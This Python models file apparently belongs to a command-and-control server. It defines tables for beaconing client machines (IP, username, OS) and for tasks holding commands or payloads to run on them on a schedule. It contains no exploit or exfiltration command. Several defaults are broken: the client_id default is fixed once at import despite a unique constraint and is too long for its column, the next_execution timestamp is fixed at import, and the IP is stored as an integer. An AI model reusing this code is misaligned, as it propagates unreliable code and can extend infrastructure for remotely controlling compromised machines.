from . import db
import uuid
from server.task_modes import TaskMode
from datetime import datetime

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(36), unique=True, nullable=False,           # Machine identifier
                          default="[SERVER-GENERATED] " + str(uuid.uuid4()))
    username = db.Column(db.String(20), unique=False, nullable=True)            # Machine account username
    last_beacon_signal = db.Column(db.DateTime, default=datetime.utcnow)        # Time when last beacon signal was recieved
    ip_address = db.Column(db.Integer, nullable=False)                          # Machine public ip address
    op_system = db.Column(db.String(30), nullable=True, default="N/A")          # Operating system
    
class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(36), nullable=False)
    command = db.Column(db.String(255), nullable=False)                  # Command to be executed on client_id machine
    command_mode = db.Column(db.String(20), nullable=False, default=TaskMode.COMMAND.value)   # Type of payload to deliver.
    repeat_interval = db.Column(db.Integer)                              # Interval in seconds to repeat command execution (if repeating)
    run_once = db.Column(db.Boolean, default=False)                      # Flag to determine if task should run once
    next_execution = db.Column(db.DateTime, default=datetime.utcnow())   # Next scheduled execution